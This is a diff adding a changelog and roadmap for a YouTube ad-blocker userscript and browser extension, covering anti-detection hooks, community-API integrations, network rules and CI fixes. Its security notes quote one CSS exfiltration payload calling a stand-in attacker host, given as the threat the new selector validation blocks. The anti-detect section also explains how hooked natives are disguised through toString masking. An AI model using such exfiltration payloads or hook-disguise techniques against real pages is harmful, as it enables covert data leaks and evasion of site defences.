+integrations (DeArrow, Return YouTube Dislike, volume boost), a full
+Unhook-style clutter panel, and deeper network coverage.
+
+### Added: anti-detect hardening
+- **`Function.prototype.toString` mask.** Every hooked native (JSON.parse,
+  fetch, XHR, Node.prototype.appendChild/insertBefore/replaceChild,
+  Promise.prototype.then, window.setTimeout, navigator.serviceWorker.register,
+  webpack chunk array push) now routes `.toString()` back to the original
+  native source. YouTube's source-inspection-based detection paths see
+  `function fetch() { [native code] }`, not our proxy.
+- **ServiceWorker registration block.** `navigator.serviceWorker.register`,
+  `getRegistration`, and `getRegistrations` are proxied so YouTube cannot
+  install a service worker that would bypass our fetch/XHR proxies. SW-
+  scoped ad beacons (`/api/stats/ads`, `/log_event`) now hit our hooks
+  instead of flowing around them.
+- **Webpack chunk array hook.** `self.webpackChunk_youtube_player.push`
+  is intercepted at document-start. Module factories whose source matches
+  ad-rendering signatures (`adPlacements`, `adBreakHeartbeatParams`,
+  `onAbnormalityDetected`, `getAdBlockedState`, `playerLegacyDesktopWatchAdsRenderer`)
+  are replaced with a no-op that fulfills the module contract without
+  running the ad-rendering body.
+- **Jittered nano-stb replacement delay.** The aggressive anti-stall
+  path used to fire at a fixed 17ms (`0.001 * 17000`), which is itself a
+  fingerprint. Replacement delay now jitters 8-45ms per invocation so
+  the neutralization pattern is no longer deterministic.
+
+### Added: UX integrations
+- **DeArrow crowd-sourced titles & thumbnails** (off by default). Uses
+  the same privacy-preserving hash-prefix API as SponsorBlock. It sends only
+  `sha256(videoID).slice(0, 4)`, never the full ID. Replaces titles
+  and thumbnails on feeds and the watch page. 6-hour TTL + LRU cache.
+- **Return YouTube Dislike** (off by default). Fetches archived vote
+  counts and injects the dislike count under the like button on watch
+  pages. 30-minute TTL + LRU cache, cookies stripped on fetch.
+- **Volume boost up to 5x** (off by default). Web Audio
+  `MediaElementSource → GainNode → destination` graph with a dedicated
+  slider in the player controls. Persisted across SPA navs.
+
+### Added: clutter-free mode (Unhook-style, all off by default)
+- `Hide home feed`, `Hide Shorts shelves`, `Hide Shorts nav entries`,
+  `Hide related videos`, `Hide comments`, `Hide end-screen cards`,
+  `Hide live chat`, `Hide merch shelves`. Each is a pure CSS rule scoped
+  to YT's own component tags. There is no runtime DOM removal that could race
+  with the player.
+
+### Added: channel + keyword blocklist
+- Two local text-area editors in the Control Center. Channel matches
+  are case-insensitive substring matches on channel name; keyword
+  matches are substring matches on video title. Applied inside the
+  existing `pruneObject` walk so every intercepted payload (fetch,
+  XHR, JSON.parse) shares the same filter.
+- **Shorts → /watch redirect** (off by default). Every `/shorts/VIDEO_ID`
+  URL hard-redirects to `/watch?v=VIDEO_ID`.
+
+### Added: network & payload coverage
+- **Expanded prune keys** with `promotedSparklesWebRenderer`,
+  `promotedVideoRenderer`, `compactPromotedVideoRenderer`,
+  `compactPromotedItemRenderer`, `backgroundPromoRenderer`,
+  `statementBannerRenderer`, `brandVideoShelfRenderer`,
+  `brandVideoSingletonRenderer`, `inlineAdLayoutRenderer`,
+  `adSlotRenderer`, `linkedInstreamAdRenderer`,
+  `shoppingCarouselRenderer`, `merchandiseShelfRenderer`.
+- **Expanded intercept patterns** with `/youtubei/v1/log_event`,
+  `/youtubei/v1/att/get`, `/youtubei/v1/att/log`,
+  `/youtubei/v1/reel_watch_sequence`, `/youtubei/v1/get_survey`,
+  `/youtubei/v1/player/ad_break`.
+- **Expanded cosmetic selectors** for `ytd-in-feed-ad-layout-renderer`,
+  `ytd-banner-promo-renderer`, `ytd-promoted-video-renderer`,
+  `ytd-compact-promoted-video-renderer`, `ytd-action-companion-ad-renderer`,
+  `ytd-brand-video-shelf-renderer`, `ytd-brand-video-singleton-renderer`.
+- **Expanded DNR rules** (8 new entries, 18 total): `||youtube.com/pagead/adview`,
+  `||youtube.com/pagead/interaction`, `||youtube.com/pcs/activeview`,
+  googlevideo `ctier=SR` (SABR-retry), googlevideo `initplayback?...adformat=`,
+  `/youtubei/v1/log_event` (POST), `/youtubei/v1/att/log` (POST),
+  `||youtube.com/generate_204`.
+
+### Added: Control Center
+- Two new live stat tiles: `DeArrow Replaced`, `Feed Filtered`.
+- Three new sections: `Experience Enhancements`, `Clutter-Free Mode`,
+  `Channels & Keywords`.
+- Anti-Detection section gains `nativeToStringMask`, `serviceWorkerBlock`,
+  `webpackChunkHook` toggles.
+- Feature toggles for `volumeBoost`, `dearrow`, `returnYoutubeDislike`,
+  `shortsRedirect` apply instantly without needing a page reload.
+
+## [0.3.3] (2026-04-22)
+
+### Changed
+- **Removed placeholder branding assets.** The auto-generated `banner.png`,
+  `favicon.ico`, `icon.svg`, and the top-level `icons/*.png` set have been
+  deleted; they were ugly placeholders rather than considered branding and
+  now live nowhere in the repo. The `icon.png` hero image that the README
+  uses is retained.
+- **Manifest no longer references the removed extension icons.** The MV3
+  manifest's `icons` block and `action.default_icon` block were dropped so
+  the extension still loads without the now-missing `extension/icons/*.png`
+  files. Chrome and Firefox will render the browser default toolbar icon
+  until a replacement branding set is commissioned and the manifest entries
+  are restored.
+
+### Fixed
+- **CI drift guard.** CI now hard-fails when the committed
+  `extension/main.js` does not match what `Build-Extension.ps1` produces
+  from the current userscript. This closes the regression class where a
+  userscript edit lands without the matching extension regeneration (the
+  failure mode that left v0.3.2 shipping a v0.3.1 extension build before
+  the hardening pass).
+- **Version-lockstep regression tests.** The repo contract tests now assert
+  that the userscript `@version`, userscript `SCRIPT_VERSION`, manifest
+  version, generated `extension/main.js` `SCRIPT_VERSION`, and README
+  version badge all agree, plus the generated build carries every required
+  shim + bridge marker, plus the `@inject-into content` directive stays
+  pinned.
+
+## [0.3.2] (2026-04-22)
+
+### Fixed
+- **Script not detected as running in Tampermonkey MV3.** Added explicit `@inject-into content`
+  directive so Tampermonkey unambiguously places the script in the content (isolated) execution
+  context, where all `GM_*` APIs are available. Without this, some MV3 builds would silently
+  skip injection when the sandbox context was ambiguous, causing the script to appear absent
+  in the Tampermonkey dashboard even though the match pattern was correct. Users who installed
+  on v0.1.1 and saw the "player blocked after 3 videos" popup should update. The iframe
+  fetch-lift defense (added in v0.2.1) and this injection fix together resolve the issue.
+
+## [0.3.1] (2026-04-17)
+
+End-to-end hardening pass. No new features, every change either fixes a
+real correctness, security, performance, or UX bug, or prevents a new
+class of failure from reaching users.
+
+### Fixed: correctness
+- **Shorts-specific fast-path pruning now keeps URL context.** The
+  fetch/XHR fast-reject helper was called without the request URL, so
+  Shorts reel payloads that only exposed the `isAd` marker could bypass
+  the cheap hint path and skip pruning entirely.
+- **SponsorBlock race on fast navigation.** Previously, if the user
+  navigated from video A to video B while A's segments were still being
+  fetched, A's segments could be applied to B's `<video>` element. The
+  handler checked `videoId` at apply time, but `videoId` still pointed at
+  A because the second nav's `loadSponsorSegments(B)` early-returned on
+  the `loading=true` flag. Replaced with a token-based guard (`loadingToken`)
+  plus a `pendingVideoId` queue, and an extra URL re-check at apply time.
+  A second URL check inside the `timeupdate` handler prevents any stale
+  segments from firing on a mismatched video.
+- **Segment de-dup + duration clamping in SponsorBlock.** Overlapping
+  segments are now deterministically resolved by `start` order; segments
+  with non-finite `start`/`end` are rejected; a seek past `video.duration`
+  is clamped to `duration - 0.01` to avoid browser-side seek refusals.
+- **Stats type safety.** A corrupt `stats` value in GM storage (e.g.
+  `blocked: "NaN"` from an older version) silently poisoned every future
+  increment into `NaN`. `loadState` now coerces each key to a finite
+  non-negative integer with `Math.floor(Number(...))`, and all writes
+  route through a new `incrementStat(name, by)` helper that guards
+  against the object being replaced at runtime.
+- **Video-ad fast-forward left the video muted after ad end.** The old
+  code set `video.muted = true` whenever `.ad-showing` was present but
+  never restored the muted state on the ad → content transition,
+  silencing the subsequent real video. Now tracks whether **we** muted
+  (distinct from the user's own mute) and only restores in that case.
+- **Stale filter cache is kept active, not discarded.** A cache past its
+  4-hour TTL used to be dropped in favor of the built-in defaults while
+  the background refresh ran, visibly losing custom coverage for the
+  first seconds of every page load. The stale copy now stays active
+  under a new `'stale'` filter source, while the refresh runs in the
+  background. The user never sees a coverage gap.
+- **Panel surviving SPA navigation.** A YouTube SPA nav that rewrote
+  `<body>` could detach the control-center overlay; the next open kept
+  the stale reference and attached handlers to an orphan. `toggleSettings`
+  now drops the reference when the overlay is no longer connected, so
+  the next open rebuilds cleanly.
+
+### Fixed: security / safety
+- **Remote JSON filter payloads now go through the same sanitizer as
+  parsed uBO lists.** Previously, a JSON-formatted remote list could
+  bypass selector/path/key validation, exceed list caps, and smuggle
+  unsafe selectors or malformed prune paths into cache. Cached filters
+  are also re-sanitized on load now, so older or corrupted snapshots
+  cannot silently reintroduce those risks.
+- **CSS-injection guard on remote filter lists.** Cosmetic selectors are
+  now validated against an allowlist (no `{`, `}`, `;`, `<`, `>`, CSS
+  comment terminators, or newlines) and capped at 400 characters each,
+  5000 cosmetic selectors total, 500 upsell selectors total. Without
+  this, a malicious or compromised filter list could inject
+  `background: url(//attacker.example/leak)` and exfiltrate request
+  context via rendered CSS. The check runs in the parser *and*
+  defensively again at CSS-generation time, covering both freshly
+  parsed and cached-from-older-versions selectors.
+- **Scriptlet argument allowlisting.** `setUndefined` and prune-key
+  paths from remote lists now have to match `identifier(.identifier)*`
+  before being applied; anything with brackets, spaces, or quotes is
+  rejected. Caps: 500 prune keys, 500 setUndefined paths.
+- **Filter-list DoS bounds.** Parser bails after 50000 input lines.
+- **Extension bridge hardening.** The `ytab:page-request` CustomEvent
+  listener (visible to any page-world script, not just ours) now only
+  accepts writes to a single allowlisted key, debounces writes at
+  150 ms, rejects payloads over 512 KB, and rejects IDs longer than
+  64 chars. Cross-subdomain sync only forwards the allowlisted key so
+  no unrelated extension storage shape can leak into untrusted code.
+
+### Fixed: performance
+- **Extension settings sync no longer needlessly rebuilds the Control
+  Center.** Mirrored `chrome.storage.local` updates used to trigger a
+  full settings-panel rebuild whenever the panel was open, even when the
+  effective settings were unchanged. The sync handler now compares a
+  small settings signature and only rebuilds on real changes, which
+  avoids extra DOM churn while keeping live status and counters updated.
+
+### Fixed: UX / release hardening
+- **Rule Library messaging now matches the extension fetch model.** The
+  Control Center and docs now explain that custom Rule Library URLs in
+  the extension build work best when the host allows direct browser
+  fetches from YouTube pages, instead of implying every raw list URL is
+  equally reliable there.
+- **CRX packaging in CI is pinned and key cleanup is automatic.** The
+  optional GitHub Actions pack step now pins `crx3@2.0.0` and removes
+  the temporary PEM on exit, which improves reproducibility and reduces
+  the chance of the signing key lingering in the runner workspace.
+- **XHR interception listener cleanup.** Readystatechange listeners are
+  now removed once a request finishes, preventing unnecessary handler
+  accumulation on reused XHR instances.
+- **Fetch/XHR proxy fast-path.** A cheap substring scan (`responseTextMightContainAds`)
+  skips the JSON parse + tree walk when the response body clearly has
+  no ad field names, eliminating the bulk of wasted work on
+  `/browse`, `/search`, `/next`, and `/guide` responses (typically
+  hundreds of KB each, many per page). URL-scoped hints preserve the
+  Shorts `isAd` path, which uses a key that isn't in `pruneKeys`.
+- **Iframe bridge hot path.** Same-origin frames that have already been
+  bridged carry a `__ytabBridged__` sentinel so repeat `contentWindow`
+  reads become O(1) boolean checks instead of five reassignments; cross-
+  origin frames are cached in a WeakMap so repeat reads don't keep
+  triggering `cw.document`-access DOMExceptions. The cache is cleared
+  on iframe `load` events so a frame that navigates between origins is
+  re-probed.
+
+### Fixed: UX
+- **Sponsor-skipped metric tile.** Previously only surfaced in the
+  small footer stats row; now sits in the main metric grid alongside
+  Ads blocked / Responses pruned / SSAP skips. Grid switched to
+  `auto-fit` so the count adapts to narrow panels.
+- **Stale-filter status.** New `'Cached list (stale)'` source label
+  surfaces when rules are being refreshed in the background.
+- **Action-button reload fallback.** If the toolbar click arrives before
+  the content script has loaded (common immediately after install),
+  the service worker now reloads the tab instead of silently failing.
+- **Extension settings mirror now rehydrates on fresh loads.** The
+  isolated-world bridge now pushes the current `chrome.storage.local`
+  snapshot into page storage at startup and flushes pending writes on
+  `pagehide`, so settings changes follow users across `www`, `m`,
+  `music`, and Kids surfaces more reliably.
+- **Kids domain coverage.** Added explicit `www.youtubekids.com`
+  coverage across userscript matches, MV3 content-script matches,
+  context-menu targeting, and DNR initiator scoping.
+
+### Fixed: CI / build
+- **Release auto-create on tag push.** Previous workflow called
+  `gh release upload --clobber` which errors out if the release doesn't
+  already exist; now calls `gh release view` and only `create`s when
+  needed. Tag version must match the manifest version.
+- **Tag/manifest version mismatch is now a hard fail.**
+- **Concurrency guard** cancels stale workflow runs on the same ref
+  so two retries can't race the upload.
+- **Build script self-check.** `Build-Extension.ps1` now verifies the
+  generated file contains all the expected shim + command-hook
+  markers, and runs `node --check` on the output if Node is on PATH.
+- **Reusable CRX packer.** Added [Build-CRX.ps1](Build-CRX.ps1) so the
+  repo can produce a signed Chromium `.crx` from the same generated
+  extension folder while reusing a preserved private key in `dist/`.
+- **Optional CRX release packaging in CI.** Tag builds now package and
+  upload a `.crx` automatically when `CHROMIUM_EXTENSION_KEY_B64` is
+  configured as a GitHub Actions secret, while still succeeding without
+  that secret for zip/userscript-only releases.
+- **Ship-zip excludes `extension/README.md`** (dev-facing) from the
+  shipped archive.
+
+### Fixed: small bugs
+- Cosmetic selector exceptions now apply to upsell selectors too, not
+  just the main cosmetic list.
+- Iframe-bridge `load` listener re-fires on every document swap (was
+  `{ once: true }`, a frame that swapped documents more than once
+  lost coverage after the first swap).
+- `inertRecords` restoration on panel close correctly handles elements
+  added after open (no longer tries to unwind state it never set).
+
+## [0.3.0] (2026-04-17)
+
+### Added: SponsorBlock
+- **Silent SponsorBlock auto-skip.** Queries the [SponsorBlock](https://sponsor.ajay.app/)
+  community database via the privacy-preserving hash-prefix endpoint
+  (only the first 4 hex chars of `sha256(videoID)` leave the client;
+  local filtering matches the exact videoID). Silently seeks past
+  segments tagged `sponsor`, `selfpromo`, `interaction`, `intro`,
+  `outro`, `preview`, `music_offtopic`, and `filler` with `actionType`
+  of `skip` or `full`. No toast, no panel nudge, just quiet skips.
+  Handled on `timeupdate` with per-segment de-duplication to avoid
+  ping-pong when a skip lands near another segment's leading edge.
+- New `sponsorSkipped` counter added to the stats footer and diagnostics
+  report so you can confirm it's working without adding any visible
+  notification to the video.
+
+### Added: Chrome / Firefox MV3 extension
+- **Structured extension build** at [extension/](extension/). The same
+  ad-blocking engine as the userscript plus MV3-native superpowers:
+  - **declarativeNetRequest rules** at [extension/rules/network-blocks.json](extension/rules/network-blocks.json)
+    block `/pagead/`, `/api/stats/ads`, `/youtubei/v1/player/ad_break`,
+    `/get_midroll_info`, `/ptracking`, googlevideo `ctier=SA` segments,
+    doubleclick.net and googlesyndication.com (from YouTube initiators
+    only), googleadservices.com, and `/api/stats/atr` ad telemetry at
+    the **browser network layer**, where no page-level anti-adblock
+    countermeasure can see them.
+  - **MAIN-world content script** at `world: "MAIN"` injects the engine
+    directly into the page context at `document_start`. No iframe
+    trick or `<script>` element is needed. Chrome 111+ / Firefox 128+.
+  - **Isolated-world bridge** at [extension/bridge.js](extension/bridge.js)
+    mirrors settings into `chrome.storage.local` so a setting change
+    on `www.youtube.com` propagates to `m.youtube.com` and
+    `music.youtube.com` on the next load.
+  - **Service worker** at [extension/background.js](extension/background.js)
+    handles the toolbar action button, a 3-item right-click context
+    menu ("Open control center / Pause-resume / Refresh rules"), and
+    three keyboard commands including a default `Ctrl+Shift+Y` to open
+    the panel.
+- **One-shot build script** [Build-Extension.ps1](Build-Extension.ps1)
+  converts [YoutubeAdblock.user.js](YoutubeAdblock.user.js) (single
+  source of truth) into [extension/main.js](extension/main.js) by
+  stripping the `==UserScript==` header, injecting `GM_*` shims
+  (`localStorage` + `chrome.storage.local` mirror, `fetch`-backed
+  `GM_xmlhttpRequest`), and wiring command-bridge listeners.
+  Windows-first workflow, no build chain needed.
+
+### Notes
+- SponsorBlock fetches use `GM_xmlhttpRequest` in the userscript and
+  native `fetch` in the extension build. Both endpoints
+  (`sponsor.ajay.app`, `raw.githubusercontent.com`) send
+  `Access-Control-Allow-Origin: *`, so the extension doesn't need a
+  background-script proxy.
+- The extension's DNR rules are additive, not a replacement for the
+  page-level engine. Together they defend at three layers: network
+  request (DNR), payload (JSON.parse/fetch/XHR proxies), and render
+  (cosmetic CSS + enforcement-popup pruning).
+
+## [0.2.1] (2026-04-17)
+
+### Added
+- **Iframe fetch-lift defense.** YouTube's 2026 anti-adblock pattern lifts
+  pristine `fetch` / `XMLHttpRequest` / `JSON.parse` out of a freshly
+  inserted same-origin iframe and uses that unhooked copy for ad delivery.
+  `appendChild`, `insertBefore`, and `replaceChild` are now all proxied,
+  and the `HTMLIFrameElement.prototype.contentWindow` getter is wrapped
+  so every read rebridges our hooks into the child window. Cross-origin
+  iframes are skipped (access throws, and YT can't lift usable globals
+  across origins either). Only the network/parsing APIs are bridged,
+  `Promise` and `setTimeout` are left alone so legitimate same-origin
+  iframes aren't affected.
+- **Aggressive anti-stall** (new anti-detection toggle). Targets the same
+  bound-`setTimeout(…, 17000)` profile that uBO's `nano-stb, [native code],
+  17000, 0.001` quick-fix rule hits. Narrowed to `delay === 17000` exactly
+  (not the 16000-18000 window the marker-based neutralizer uses) to keep
+  false-positives low on legitimate 17s bound timers. Disabled in the
+  normal neutralizer path, so turning the toggle off restores v0.2.0
+  behavior.
+- **Video ad fast-forward** (new last-resort toggle). If the prune/intercept
+  layers miss a payload and a client-side ad actually starts playing, the
+  `.ad-showing` class on `#movie_player` triggers mute + 16x playback rate
+  on the `<video>`, shaving unskippable ads to under a second without
+  relying on `seekTo` (which YT can reject on some ad surfaces).
+- **Wider pruneKey coverage.** Built-in filters now strip
+  `adBreakHeartbeatParams`, `frameworkUpdates`, `responseContext.adSignalsInfo`,
+  `playerResponse.adBreakHeartbeatParams`, and
+  `(playerResponse.)auxiliaryUi.messageRenderers.upsellDialogRenderer` from
+  every parsed response. `/youtubei/v1/guide` is now in the intercept
+  patterns so the enforcement-popup payload is caught before it leaves
+  the network layer, not just by cosmetic CSS after render.
+- **Enforcement-popup cosmetic fallback.** `ytd-enforcement-message-view-model`
+  and its `tp-yt-paper-dialog` wrapper are hidden by default if pruning ever
+  lets one through.
+
+### Notes
+- The iframe `contentWindow` getter wrap is best-effort. If another
+  script (e.g. another adblock userscript) has already locked the getter
+  non-configurable, YoutubeAdblock skips it silently and the node-insertion
+  proxies still cover the common path.
+- Aggressive anti-stall only fires on bound/native functions at exactly
+  17000 ms. If you see unrelated 17 s features running too fast, turn it
+  off in the control center.
+
+## [0.2.0] (2026-04-17)
+
+### Added
+- Background content becomes `inert` + `aria-hidden` while the control center
+  is open so keyboard users and screen readers stay inside the dialog.
+  Previously-set state on YouTube nodes is preserved and restored on close,
+  rather than clobbered.
+- Menu-triggered "Open Control Center" now builds the panel on demand if the
+  user picks it before DOMContentLoaded; previously a no-op.
+- Diagnostics report now includes timestamp, user agent, trapped roots,
+  prune-key count, cosmetic selector count, and intercept patterns. That is
+  enough context to triage a bug report without a follow-up.
+- URL input preserves in-progress typing across settings panel rebuilds
+  (feature toggles used to wipe the user's unsaved edit).
+- Toast cap (4 visible) plus input-type sanitization so transient error
+  bursts don't fill the viewport.
+- Focus trap now pulls focus back into the panel if it escapes, not just on
+  wrap-around.
+- Feature toggles now expose `role="switch"` with `aria-checked` so
+  assistive tech announces on/off state instead of generic tick/untick.
+- Property traps now eagerly prune any already-populated root at install
+  time, so ad fields a page-inline `<script>` committed before our trap
+  installed no longer reach the first paint.
+- SSAP polling pauses while the tab is hidden.
+- Toggle inputs now carry `aria-describedby` pointing at the visible
+  description so AT users hear *what the switch does*, not just its short
+  label.
+- Rule-source fetch errors now surface the underlying reason (`HTTP 404`,
+  `exceeds 5MB limit`, `Invalid JSON filter schema`) rather than a generic
+  "could not be parsed".
+- `safeOverride` now logs one warning per locked property when another
+  script has made the target non-configurable, helps diagnose conflicts
+  with other YouTube adblock userscripts.
+- `matchesInterceptPattern` compiles its patterns into a single RegExp
+  once per-array-identity, replacing N `String#includes` iterations per
+  request with a single regex match.
+- A `<head>`-scoped `MutationObserver` re-applies the cosmetic stylesheet
+  if YouTube or a detection script removes it. Observer is lazily attached
+  on first cosmetic update so we don't spend the MutationObserver budget
+  before the stylesheet actually matters.
+- Overlay `aria-hidden` is now **removed** rather than set to `"false"`
+  when the dialog opens, explicit `aria-hidden="false"` conflicts with
+  ancestor inheritance in some assistive tech.
+- Feature counts (`Modules enabled`, `N/M on` pills) now count the
+  canonical feature set rather than whatever keys a cached filter payload
+  happens to carry. A stale cache with orphan keys no longer inflates
+  the displayed module count.
+- `Intl.NumberFormat` and `Intl.DateTimeFormat` are now lazily
+  instantiated once and reused. Previously every stats tick and every
+  chip re-render constructed a new formatter.
+
+### Fixed
+- **Property traps now cover every declared path.** The previous implementation called `Object.defineProperty` on `window.ytInitialPlayerResponse` once per configured path, so only the first (`playerAds`) succeeded and `adPlacements`, `adSlots`, and `adBreakHeartbeatParams` were never trapped. Paths are now grouped by root and handled together.
+- **Timer neutralization no longer breaks YouTube's own 17s callbacks.** The old heuristic matched `[native code]` (which every bound function prints) and any callback shorter than 50 characters; both fired legitimate timers at 1ms. The tightened rule only fires on callbacks containing known anti-adblock markers (`onAbnormal`, `adBlock`, `abnormalityDetected`) and ignores bound/native functions entirely.
+- **XHR proxy honors `responseType='json'`.** Previously, rewriting the response handed callers a string when they had requested an object, breaking YouTube code paths that parse by responseType. The proxy now inspects `responseType` and serializes/parses appropriately; binary responseTypes are skipped.
+- **Blocked counter no longer inflates.** Fetch interception incremented the counter on every intercepted URL (not just actual blocks) and double-counted via the already-proxied `JSON.parse`. The fetch and XHR proxies now bypass the JSON.parse proxy using a captured original and only count actual rewrites.
+- **Shorts ad pruning is scoped by URL.** The prior implementation filtered any parsed JSON containing an `entries` array, which could silently remove non-ad entries from unrelated YouTube payloads. Shorts pruning now only runs when the URL matches `reel_watch_sequence` / `/reel`.
+- **Remote filter updates now re-apply property traps.** New roots introduced by remote rules get guarded, and new subpaths on already-trapped roots are picked up via a shared mutable map instead of being closed over statically.
+- **Cosmetic stylesheet self-heals after SPA nav.** The cached reference is now validated with `isConnected` before reuse so a `<head>` rewrite no longer freezes cosmetic cleanup.
+- **Focus and scroll preserved across settings rebuilds.** Toggling a feature no longer yanks keyboard focus to the top of the panel.
+- **Pause/Resume menu command now reflects current state.** The label is re-registered whenever protection is toggled (where `GM_unregisterMenuCommand` is available).
+- **Filter URL validated on load.** A corrupted saved value is silently replaced with the default instead of stranding the user with a broken source.
+
+### Performance
+- SSAP auto-skip replaced `MutationObserver` on the whole document (firing thousands of times per second on YouTube) with a 1-second poll of the player's debug info.
+- `Promise.prototype.then` abnormality check now caches decisions per-function in a `WeakSet`, so hot Promise chains avoid repeat `Function.prototype.toString` calls.
+- Stats persistence is debounced by 2s so fast-firing ad-pruning paths no longer touch GM storage on every object.
+- The panel stats refresh loop only repaints while the control center is open.
+- `replaceAdKeys` caches its compiled RegExp array by source and reuses it across all fetch/XHR interceptions.
+- Three internal `JSON.parse` call sites (filter fetch, outbound fetch body rewrite, outbound XHR body rewrite) now bypass our own JSON.parse proxy via a captured original, avoiding unnecessary re-entry into `pruneObject` on payloads that definitionally contain no ad keys.
+
+### Security / safety
+- Remote filter lists are now capped at 5MB and the HTTP status is verified before parsing; malformed or oversized responses are rejected.
+- `@connect *` added so users who configure a custom filter URL on a non-GitHub host can actually fetch it (previously blocked by Tampermonkey's connect policy).
+- Fetch proxy skips rewriting non-JSON responses by inspecting `Content-Type`, reducing the chance of mangling unintended payloads.
+- Rewritten responses strip `Content-Length` so strict consumers reading the declared length against the new payload don't see a mismatch.
+- `GM_getValue`/`GM_setValue` are wrapped in try/catch; a corrupted key or quota rejection no longer throws past the caller.
+- XHR proxy coerces the `url` arg to a string so a `URL` instance passed to `open()` (legal per spec) cannot trip `String#includes`.
+
+### UX
+- Expanded `interceptPatterns` to match the endpoints the README advertises (`/youtubei/v1/browse`, `/search`, `/next`).
+- Cache-busting query string now correctly joins with `&` when the URL already contains `?`.
+
+### Chore
+- `@downloadURL` / `@updateURL` / `@homepageURL` / `@supportURL` now use canonical repo casing (`YoutubeAdblock`).
+- Dropped the unused `networkBlocks` accumulator and the unused `shortsAdPrune` field from `DEFAULT_FILTERS`.
+
+## [0.1.1] (2026-04-16)
+
+- Added a redesigned in-product control center with stronger hierarchy, live status, diagnostics, and calmer feedback states.
+- Added a real master switch, runtime-safe feature toggles, timer neutralization controls, and better rule-source refresh handling.
+- Added first-run guidance plus extra userscript menu commands for opening the control center, pausing or resuming protection, and refreshing rules.
+- Improved destructive-action UX by replacing native confirmation prompts with an in-context two-step confirmation flow.
+- Refined the README and changelog so onboarding, configuration, and versioning better match the current product surface.
+
+## [0.0.3]
+
+- Earlier repository snapshot before the 0.1.x control-center and UX refinement work.
+
+## Roadmap archive, 2026-08-10, ROADMAP.md
+
+<details>
+<summary>Original roadmap snapshot</summary>
+
+```markdown
+# YoutubeAdblock Roadmap
+
+Forward-looking scope for the split-context YouTube ad blocker (userscript + Chrome MV3 extension + Firefox MV3).
+
+## Planned Features
+
+### Blocking Engine
+- `Trusted Types` full coverage audit: eliminate remaining string-HTML code paths in the Control Center.
+
+### Control Center
+- Per-surface toggles (home feed, watch, shorts, YT Music, YT Kids) with independent engine profiles.
+- Exportable diagnostic bundle (counters, last 50 prune events, UA, version) as a single JSON for bug reports.
+- Rules playground: paste a custom uBO-style selector and preview what it would hide on the current page.
+- Dark-mode CSS audit for Control Center contrast ratio ≥ AA.
+
+### SponsorBlock / DeArrow Integration
+- Category-aware skip behavior: auto-skip sponsor, mute-ads-only for self-promo, manual for filler.
+- Offline vote cache: submit SponsorBlock segments from within the Control Center without leaving YouTube.
+- DeArrow submission UI for replacing clickbait titles directly from the player (gated behind opt-in).
+
+### Extension
+- Firefox MV3 stable release: drop the temporary-add-on path once `background.scripts` stops being a compat hack.
+- Declarative NetRequest dynamic rules: ship a rules update endpoint for fast response when YouTube rotates endpoints.
+- Popup (toolbar) UI mirroring Control Center for users who never use the userscript menu.
+- Enterprise policy schema (`managed_schema`) so IT admins can lock defaults.
+
+## Nice-to-Haves
+- Webext background job that refreshes the filter list on `chrome.alarms`, independent of page reloads.
+- A minimal variant (`Lite`) that only ships payload pruning + CSS cleanup for users on low-end hardware.
+- Playback quality forcer (auto-select 1080p/4K on load) as an optional power-user toggle.
+- Per-tab "engine disabled" indicator in the toolbar icon when a site breakage recovery was triggered.
+
+## Research-Driven Additions
+
+Evidence and competitive context: see RESEARCH.md (consolidated; older inline research notes moved there).
+
+### P2: validation and migration
+
+- [ ] P2, Turn `STRINGS` into a real i18n pipeline
+  Why: Visible copy is centralized, but there is no `_locales` output, `default_locale`, or userscript locale resolver yet.
+  Evidence: `YoutubeAdblock.user.js:386`, `tests/repo-contract.test.mjs:131-168`, Chrome `i18n` API docs.
+  Touches: `YoutubeAdblock.user.js`, `Build-Extension.ps1`, `extension/manifest.json`, generated `_locales`, `tests/repo-contract.test.mjs`.
+  Acceptance: Extension build emits default locale messages, manifest uses localized name/description where appropriate, userscript keeps English fallback, and tests fail if new visible copy bypasses the locale table.
+  Complexity: L
+
+- [ ] P2, Add live userscript-manager and mobile validation matrix
+  Why: Browser-smoke fixtures pass, but README claims Tampermonkey, Violentmonkey, Safari Userscripts, and Firefox Android paths that are not exercised live.
+  Evidence: `README.md:8-55`, `tests/browser-smoke.test.mjs`, Tampermonkey YouTube/MV3 injection issues.
+  Touches: `tests/browser-smoke.test.mjs`, optional local test tooling, README support notes.
+  Acceptance: A local validation script records pass/fail for Tampermonkey Chrome MV3, Violentmonkey Firefox, Safari Userscripts when available, and Firefox Android or emulator/device when available; unsupported environments are reported explicitly.
+  Complexity: L
+
+- [ ] P2, Add community API cache and privacy controls
+  Why: SponsorBlock, DeArrow, and RYD data are cached locally, but users cannot inspect or clear those caches independently from restoring all settings.
+  Evidence: SponsorBlock/DeArrow/RYD API docs, `README.md:85-93`, local cache helpers in `YoutubeAdblock.user.js`.
+  Touches: `YoutubeAdblock.user.js`, `tests/engine-core.test.mjs`, Control Center diagnostics/recovery section.
+  Acceptance: Control Center shows community API cache counts/ages, can clear SponsorBlock/DeArrow/RYD caches independently, and copied diagnostics reports cache state without video history leakage.
+  Complexity: M
+
+- [ ] P2, Make SponsorBlock SSAI-aware
+  Why: Server-side insertion can shift content timestamps, so SponsorBlock skip/view behavior should not silently pollute metrics or skip the wrong segment after an SSAI signal.
+  Evidence: `YoutubeAdblock.user.js:2093-2184`, `YoutubeAdblock.user.js:3360-3361`, AdGuard SSAI analysis, SponsorBlock API docs.
+  Touches: SponsorBlock skip/view path in `YoutubeAdblock.user.js`, diagnostics, `tests/engine-core.test.mjs`.
+  Acceptance: When current-video SSAI is detected, SponsorBlock skips either pause with a warning or run in an offset-safe mode, view pings are suppressed for uncertain offsets, and diagnostics reports the chosen behavior.
+  Complexity: M
+
+- [ ] P2, Add a manual uAssets quick-fix ingestion tool
+  Why: YouTube fixes move through uAssets faster than this repo's bundled filter/signature files, but updates are manual and easy to miss.
+  Evidence: uAssets YouTube ongoing issues, `youtube-adblock-filters.txt`, `tools/sign-filter-manifest.mjs`, `webpack-ad-signatures.json`.
+  Touches: new non-md tool under `tools/`, `youtube-adblock-filters.txt`, `webpack-ad-signatures.json`, filter/signature manifests, tests.
+  Acceptance: A local command fetches upstream quick-fixes, maps supported scriptlets to bundled equivalents, leaves dangerous/unsupported rules as rejected coverage, re-signs filter/signature data, and runs the relevant parser/signature tests.
+  Complexity: M
+
+### P2: diagnostics and performance additions
+
+- [ ] P2, Add extension DNR matched-rule diagnostics
+  Why: Page diagnostics cannot prove whether the browser network-layer rules actually fired, which makes extension-specific ad reports hard to triage.
